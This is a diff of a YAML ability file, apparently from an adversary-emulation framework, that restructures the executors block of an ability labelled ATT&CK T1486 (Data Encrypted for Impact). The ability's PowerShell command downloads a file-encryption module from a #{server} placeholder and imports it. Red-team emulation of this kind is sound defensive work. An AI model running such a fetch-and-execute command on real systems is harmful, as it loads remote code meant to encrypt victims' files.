@@ -3,14 +3,14 @@
 - id: 0353934b-a398-41bb-b55a-7db64dd575ca
   name: Install cryptography module
   description: Install a module for encrypting files
-  executors:
-    - psh
   tactic: impact
   technique:
     attack_id: T1486
     name: Data Encrypted for Impact
-  command: |
-    Invoke-WebRequest -Uri #{server}/file/download -Method POST -Headers @{'file'='FileCryptography.psm1'} -OutFile FileCryptography.psm1
-    import-module FileCryptography.psm1;
-  cleanup: |
-    Remove-Item FileCryptography.psm1
+  executors:
+    psh:
+      command: |
+        Invoke-WebRequest -Uri #{server}/file/download -Method POST -Headers @{'file'='FileCryptography.psm1'} -OutFile FileCryptography.psm1
+        import-module FileCryptography.psm1;
+      cleanup: |
+        Remove-Item FileCryptography.psm1
